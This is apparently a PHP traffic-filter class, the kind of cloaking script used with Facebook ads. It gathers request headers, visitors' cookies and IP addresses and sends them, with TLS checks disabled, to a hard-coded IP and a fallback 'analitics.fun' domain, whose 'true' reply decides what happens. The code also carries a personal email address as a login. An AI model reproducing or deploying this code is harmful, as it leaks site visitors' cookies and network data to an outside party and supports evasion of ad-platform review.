<?php

class Handler
{
    protected $curlOne;
    protected $curlTwo;
    protected $result;
    protected $headers;

    public function __construct()
    {
        $this->httpGetAllHeaders();
        $this->curlOne = $this->getCurl($this->oneServer());
        $this->curlTwo = $this->getCurl($this->twoServer());
    }

    public function runHandler()
    {
        if ($this->options($this->curlOne)) {
            return strnatcasecmp(trim($this->result),"true") == 0 ? true : false;
        } else {
            if ($this->options($this->curlTwo)) {
                return strnatcasecmp(trim($this->result),"true") == 0 ? true : false;
            } else {
                return false;
            }
        }
    }

    private function options($curl)
    {

        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($curl, CURLOPT_HTTPHEADER, $this->headers);
        curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
        curl_setopt($curl, CURLOPT_REFERER, $_SERVER['HTTP_REFERER']);

        curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 3);
        curl_setopt($curl, CURLOPT_TIMEOUT, 3);
        curl_setopt($curl, CURLOPT_TIMEOUT_MS, 2000);



        $this->result = curl_exec($curl);


        return curl_getinfo($curl, CURLINFO_HTTP_CODE) == 200;
    }


    private function getCurl($path)
    {
        return curl_init($path);
    }


    private function oneServer()
    {
        return "https://194.247.12.107/filterFB/filterForSiteLine2.php";
        
    }

    private function twoServer()
    {
        return "https://v1.0.analitics.fun/filterFB/filterForSiteLine2.php";

    }

    private function httpGetAllHeaders()

    {

        $headersToFind = [

            'HTTP_X_REAL_IP',

            'HTTP_DEVICE_STOCK_UA',

            'REMOTE_ADDR',

            'HTTP_X_FORWARDED_FOR',

            'HTTP_X_OPERAMINI_PHONE_UA',

            'X_FB_HTTP_ENGINE',

            'HTTP_X_FB_HTTP_ENGINE',

            'REQUEST_SCHEME',

            'HEROKU_APP_DIR',

            'CONTEXT_DOCUMENT_ROOT',

            'X_PURPOSE',

            'HTTP_X_PURPOSE',

            'SCRIPT_FILENAME',

            'PHP_SELF',

            'SCRIPT_NAME',

            'HTTP_ACCEPT_ENCODING',

            'REQUEST_URI',

            'REQUEST_TIME_FLOAT',

            'QUERY_STRING',

            'HTTP_ACCEPT_LANGUAGE',

            'HTTP_INCAP_CLIENT_IP',

            'PROFILE',

            'X_FORWARDED_FOR',

            'X_WAP_PROFILE',

            'HTTP_COOKIE',

            'WAP_PROFILE',

            'HTTP_REFERER',

            'HTTP_VIA',

            'HTTP_CLIENT_IP',
            'HTTP_X_REQUESTED_WITH',

            'HTTP_USER_AGENT',

            'HTTP_HOST',

            'HTTP_CONNECTION',

            'HTTP_ACCEPT',

            'HTTP_CF_CONNECTING_IP',

            'HTTP_REFERRER_POLICY',

            'HTTP_CACHE_CONTROL',

            'HTTP_UPGRADE_INSECURE_REQUESTS',

            'HTTP_SEC_FETCH_MODE',

            'HTTPS',
            'ACCESS-CONTROL-ALLOW-CREDENTIALS',
            'ACCESS-CONTROL-MAX-AGE',
            'X-Forwarded-Host',
            'X-Frame-Options',
            'Content-Length',
            'From'


        ];


        $headers = [];


        foreach ($headersToFind as $header) {

            if (!array_key_exists($header, $_SERVER)) {

                continue;

            }

            $key = 'X-LC-' . str_replace('_', '-', $header);

            $value = is_array($_SERVER[$header]) ? implode(',', $_SERVER[$header]) : $_SERVER[$header];

            $headers[] = $key . ':' . $value;
            //echo $key . ':' . $value ."</br>";
        }


        $headers[] = 'company: SweepHuOne20';
        $headers[] = 'login: ruslanruslan1996@gmail.com';

        $this->headers = $headers;

    }

}
